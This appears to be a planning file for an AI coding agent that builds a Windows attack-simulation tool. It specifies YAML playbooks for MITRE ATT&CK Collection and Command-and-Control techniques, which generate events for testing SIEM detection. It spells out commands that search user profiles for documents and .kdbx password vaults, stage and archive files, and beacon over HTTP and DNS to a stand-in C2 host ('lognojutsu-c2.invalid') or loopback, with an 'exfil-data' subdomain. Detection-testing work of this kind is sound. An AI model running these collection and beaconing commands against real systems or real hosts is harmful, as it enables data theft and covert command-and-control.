---
phase: 03-additional-techniques
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml
  - internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml
  - internal/playbooks/embedded/techniques/T1119_automated_collection.yaml
  - internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml
  - internal/playbooks/embedded/techniques/T1071_004_dns.yaml
autonomous: true
requirements: [TECH-01, TECH-03]

must_haves:
  truths:
    - "5 new ATT&CK YAML files exist and are parseable by the Go YAML loader"
    - "Each new ATT&CK technique has non-empty expected_events with only queryable channels"
    - "Collection tactic gap filled with T1005, T1560.001, T1119"
    - "C2 tactic gap filled with T1071.001, T1071.004"
    - "All C2 techniques use safe destinations (.invalid TLD or loopback)"
    - "Each technique uses 3-5 command variants for SIEM signal diversity"
  artifacts:
    - path: "internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml"
      provides: "Collection — Data from Local System technique"
      contains: "tactic: collection"
    - path: "internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml"
      provides: "Collection — Archive Collected Data technique"
      contains: "tactic: collection"
    - path: "internal/playbooks/embedded/techniques/T1119_automated_collection.yaml"
      provides: "Collection — Automated Collection technique"
      contains: "tactic: collection"
    - path: "internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml"
      provides: "C2 — Web Protocols technique"
      contains: "tactic: command-and-control"
    - path: "internal/playbooks/embedded/techniques/T1071_004_dns.yaml"
      provides: "C2 — DNS technique"
      contains: "tactic: command-and-control"
  key_links:
    - from: "internal/playbooks/loader.go"
      to: "internal/playbooks/embedded/techniques/*.yaml"
      via: "fs.WalkDir auto-discovery at build time"
      pattern: "WalkDir.*embedded/techniques"
---

<objective>
Create all 5 new MITRE ATT&CK technique YAML files: 3 Collection techniques (T1005, T1560.001, T1119) and 2 Command & Control techniques (T1071.001, T1071.004). All follow the established multi-variant deep execution style with structured EventSpec entries.

Purpose: Fills the Collection and C2 tactic coverage gaps (per D-01, D-02). Satisfies TECH-01 (5 new techniques) and contributes to TECH-03 (all with expected_events).
Output: 5 new YAML files in internal/playbooks/embedded/techniques/ auto-discovered by loader.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md

@internal/playbooks/types.go
@internal/playbooks/loader.go
@internal/playbooks/embedded/techniques/T1057_process_discovery.yaml
@internal/playbooks/embedded/techniques/T1041_exfiltration_http.yaml

<interfaces>
<!-- EventSpec struct from internal/playbooks/types.go — all expected_events entries must match this -->
From internal/playbooks/types.go:
```go
type EventSpec struct {
    EventID     int    `yaml:"event_id"`
    Channel     string `yaml:"channel"`
    Description string `yaml:"description"`
    Contains    string `yaml:"contains,omitempty"`
}
```

Only queryable channels allowed in expected_events:
- "Security"
- "Microsoft-Windows-PowerShell/Operational"
- "Microsoft-Windows-Sysmon/Operational"

YAML fields required (from Technique struct):
id, name, description, tactic, technique_id, platform, phase, elevation_required, expected_events, tags, executor (type + command), cleanup
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create 3 Collection technique YAML files (T1005, T1560.001, T1119)</name>
  <files>
    internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml
    internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml
    internal/playbooks/embedded/techniques/T1119_automated_collection.yaml
  </files>
  <read_first>
    internal/playbooks/embedded/techniques/T1057_process_discovery.yaml
    internal/playbooks/types.go
    .planning/phases/03-additional-techniques/03-RESEARCH.md
  </read_first>
  <action>
Create 3 YAML files for Collection tactic techniques. All must follow the T1057 multi-variant pattern (per D-06) with 3-5 command variants each.

**T1005_data_from_local_system.yaml** (per D-02):
- id: T1005, tactic: collection, technique_id: T1005, platform: windows, phase: attack, elevation_required: false
- tags: [collection, no-prereqs]
- expected_events:
  - event_id: 4688, channel: "Security", description: "cmd.exe — dir /s /b on user profile paths"
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — Get-ChildItem recursive search for sensitive file types"
  - event_id: 1, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon process creation — robocopy.exe staging to temp directory"
- Command block must:
  1. `cmd /c "dir /s /b %USERPROFILE%\Documents"` — enumerate documents (EID 4688)
  2. `Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx -ErrorAction SilentlyContinue | Select-Object -First 20` — credential/config file search (EID 4104)
  3. Create `$env:TEMP\lnj_stage\` directory, write synthetic test file `lnj_stage\sensitive_data.txt` with dummy content
  4. `robocopy $env:USERPROFILE\Desktop $env:TEMP\lnj_stage /e /xl /xj /r:0 /w:0` — staging copy attempt (Sysmon EID 1 for robocopy.exe)
  5. Start with `Write-Host "[T1005] Data from Local System — ..."`, end with `Write-Host "[T1005] Complete. EID 4688 + 4104 + Sysmon 1 generated."`
- cleanup: `Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore`

**T1560_001_archive_collected_data.yaml** (per D-02):
- id: T1560.001, tactic: collection, technique_id: T1560.001, platform: windows, phase: attack, elevation_required: false
- tags: [collection, no-prereqs]
- expected_events:
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — Compress-Archive creating zip from staged files"
  - event_id: 4688, channel: "Security", description: "compact.exe — NTFS compression on staged directory"
  - event_id: 11, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon FileCreate — archive file (.zip) creation"
- Command block must:
  1. Create staging dir `$env:TEMP\lnj_stage\` with 3-5 synthetic files if not exists
  2. `Compress-Archive -Path "$env:TEMP\lnj_stage\*" -DestinationPath "$env:TEMP\lnj_archive.zip" -Force` — PS archival (EID 4104)
  3. `compact.exe /C "$env:TEMP\lnj_stage"` — NTFS compression alternative (EID 4688)
  4. `Get-Item "$env:TEMP\lnj_archive.zip" | Select-Object Name, Length, CreationTime` — verify archive created
  5. Start with `Write-Host "[T1560.001] Archive Collected Data — ..."`, end with `Write-Host "[T1560.001] Complete. EID 4104 + 4688 + Sysmon 11 generated."`
- cleanup: |-
    Remove-Item "$env:TEMP\lnj_archive.zip" -Force -ErrorAction Ignore
    Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore
    Write-Host "Cleanup: Archive and staging artifacts removed."

**T1119_automated_collection.yaml** (5th technique — Claude's discretion per D-02):
- id: T1119, tactic: collection, technique_id: T1119, platform: windows, phase: attack, elevation_required: false
- tags: [collection, no-prereqs]
- expected_events:
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — ForEach-Object automated file metadata collection loop"
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — Get-WmiObject Win32_LogicalDisk automated inventory", contains: "Win32_LogicalDisk"
  - event_id: 1, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon process creation — PowerShell executing automated collection script"
- Command block must:
  1. PS loop over `$env:USERPROFILE` collecting file metadata (name, size, lastwrite) into `$collected` array — automated enumeration (EID 4104)
  2. `Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace` — disk inventory (EID 4104)
  3. Write collected metadata to `$env:TEMP\lnj_collection_index.txt` — simulates attacker indexing target files
  4. Output count of indexed items
  5. Start with `Write-Host "[T1119] Automated Collection — ..."`, end with `Write-Host "[T1119] Complete. EID 4104 + Sysmon 1 generated."`
- cleanup: `Remove-Item "$env:TEMP\lnj_collection_index.txt" -Force -ErrorAction Ignore`
  </action>
  <verify>
    <automated>go build ./internal/playbooks/... 2>&1</automated>
  </verify>
  <acceptance_criteria>
    - File internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml exists and contains `id: T1005`
    - File internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml contains `tactic: collection`
    - File internal/playbooks/embedded/techniques/T1005_data_from_local_system.yaml contains `expected_events:`
    - File internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml exists and contains `id: T1560.001`
    - File internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml contains `tactic: collection`
    - File internal/playbooks/embedded/techniques/T1560_001_archive_collected_data.yaml contains `Compress-Archive`
    - File internal/playbooks/embedded/techniques/T1119_automated_collection.yaml exists and contains `id: T1119`
    - File internal/playbooks/embedded/techniques/T1119_automated_collection.yaml contains `tactic: collection`
    - All 3 files contain `platform: windows` and `phase: attack`
    - All 3 files contain only queryable channels: "Security", "Microsoft-Windows-PowerShell/Operational", or "Microsoft-Windows-Sysmon/Operational"
    - T1005 has cleanup containing `lnj_stage`
    - T1560.001 has cleanup containing `lnj_archive.zip`
    - T1119 has cleanup containing `lnj_collection_index.txt`
    - `go build ./internal/playbooks/...` exits 0
  </acceptance_criteria>
  <done>3 Collection YAML files created with valid structure, expected_events populated, multi-variant commands, proper cleanup blocks. Build succeeds.</done>
</task>

<task type="auto">
  <name>Task 2: Create 2 Command & Control technique YAML files (T1071.001, T1071.004)</name>
  <files>
    internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml
    internal/playbooks/embedded/techniques/T1071_004_dns.yaml
  </files>
  <read_first>
    internal/playbooks/embedded/techniques/T1041_exfiltration_http.yaml
    internal/playbooks/embedded/techniques/T1057_process_discovery.yaml
    internal/playbooks/types.go
    .planning/phases/03-additional-techniques/03-RESEARCH.md
  </read_first>
  <action>
Create 2 YAML files for Command & Control tactic. Both must use safe C2 simulation per D-07: `.invalid` TLD or loopback targets only. No real outbound C2 traffic.

**T1071_001_web_protocols.yaml** (per D-02, D-07):
- id: T1071.001, tactic: command-and-control, technique_id: T1071.001, platform: windows, phase: attack, elevation_required: false
- tags: [command-and-control, no-prereqs]
- expected_events:
  - event_id: 3, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon NetworkConnect — HTTP beacon attempt to non-existent C2 host"
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — Invoke-WebRequest C2 beacon simulation"
  - event_id: 22, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon DNSEvent — DNS resolution attempt for C2 hostname"
- Command block must:
  1. `try { Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -Method GET -TimeoutSec 3 -ErrorAction Stop } catch { Write-Host "Beacon failed as expected..." }` — HTTP GET beacon (Sysmon EID 3 + EID 22 + EID 4104)
  2. `try { Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in" -TimeoutSec 2 -ErrorAction Stop } catch { Write-Host "Loopback beacon..." }` — loopback fallback (Sysmon EID 3)
  3. `try { (New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks") } catch { Write-Host "WebClient API beacon..." }` — alternative API (EID 4104)
  4. Beacon interval simulation: 3 attempts with `Start-Sleep -Seconds 2` between (simulates C2 heartbeat pattern)
  5. Start with `Write-Host "[T1071.001] Application Layer Protocol: Web Protocols — C2 beacon simulation"`, end with `Write-Host "[T1071.001] Complete. Sysmon EID 3 + EID 22 + EID 4104 generated."`
- cleanup: ""

**T1071_004_dns.yaml** (per D-02, D-07):
- id: T1071.004, tactic: command-and-control, technique_id: T1071.004, platform: windows, phase: attack, elevation_required: false
- tags: [command-and-control, no-prereqs]
- expected_events:
  - event_id: 22, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon DNSEvent — DNS query to C2 subdomain (DNS tunneling simulation)"
  - event_id: 4688, channel: "Security", description: "nslookup.exe — DNS C2 lookup for beacon subdomain"
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — Resolve-DnsName C2 DNS query"
- Command block must:
  1. `nslookup beacon.lognojutsu-c2.invalid 2>&1 | Write-Host` — classic DNS lookup (EID 4688 + Sysmon EID 22)
  2. DNS tunneling simulation: loop 5-10 queries to distinct subdomains `c2-1.lognojutsu-c2.invalid` through `c2-5.lognojutsu-c2.invalid` with `Resolve-DnsName` — generates multiple EID 22 events (mimics DNS C2 pattern)
  3. `Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue` — simulates DNS exfil (EID 4104 + EID 22)
  4. Output total DNS query count
  5. Start with `Write-Host "[T1071.004] Application Layer Protocol: DNS — DNS C2 simulation"`, end with `Write-Host "[T1071.004] Complete. Sysmon EID 22 + EID 4688 + EID 4104 generated."`
- cleanup: ""

CRITICAL SAFETY: All URIs must use `.invalid` TLD (RFC 2606 reserved — guaranteed DNS failure) or `127.0.0.1` loopback. Never use real external domains.
  </action>
  <verify>
    <automated>go build ./internal/playbooks/... 2>&1</automated>
  </verify>
  <acceptance_criteria>
    - File internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml exists and contains `id: T1071.001`
    - File internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml contains `tactic: command-and-control`
    - File internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml contains `lognojutsu-c2.invalid`
    - File internal/playbooks/embedded/techniques/T1071_001_web_protocols.yaml does NOT contain any real external domain (no `.com`, `.net`, `.org` in URIs)
    - File internal/playbooks/embedded/techniques/T1071_004_dns.yaml exists and contains `id: T1071.004`
    - File internal/playbooks/embedded/techniques/T1071_004_dns.yaml contains `tactic: command-and-control`
    - File internal/playbooks/embedded/techniques/T1071_004_dns.yaml contains `Resolve-DnsName`
    - File internal/playbooks/embedded/techniques/T1071_004_dns.yaml contains `nslookup`
    - Both files contain `platform: windows` and `phase: attack`
    - Both files have `cleanup: ""`
    - Both files contain only queryable channels
    - `go build ./internal/playbooks/...` exits 0
  </acceptance_criteria>
  <done>2 C2 YAML files created with safe simulation commands (.invalid TLD / loopback only), expected_events populated, multi-variant commands. Build succeeds.</done>
</task>

</tasks>

<verification>
- `go build ./internal/playbooks/...` exits 0 (all 5 new YAML files embedded and parseable)
- `go test ./internal/playbooks/... -count=1` passes (existing tests still green)
- 5 new files exist in internal/playbooks/embedded/techniques/ matching expected names
- grep confirms all 5 files have `expected_events:` populated
- grep confirms no real external domains in C2 files (only `.invalid` and `127.0.0.1`)
</verification>

<success_criteria>
- 5 new MITRE ATT&CK technique YAML files created and loadable
- Collection tactic: T1005, T1560.001, T1119
- C2 tactic: T1071.001, T1071.004
- All have expected_events with only queryable channels
- All C2 techniques use safe destinations
- Each technique has 3-5 command variants per D-06
- Build and existing tests pass
</success_criteria>

<output>
After completion, create `.planning/phases/03-additional-techniques/03-01-SUMMARY.md`
</output>
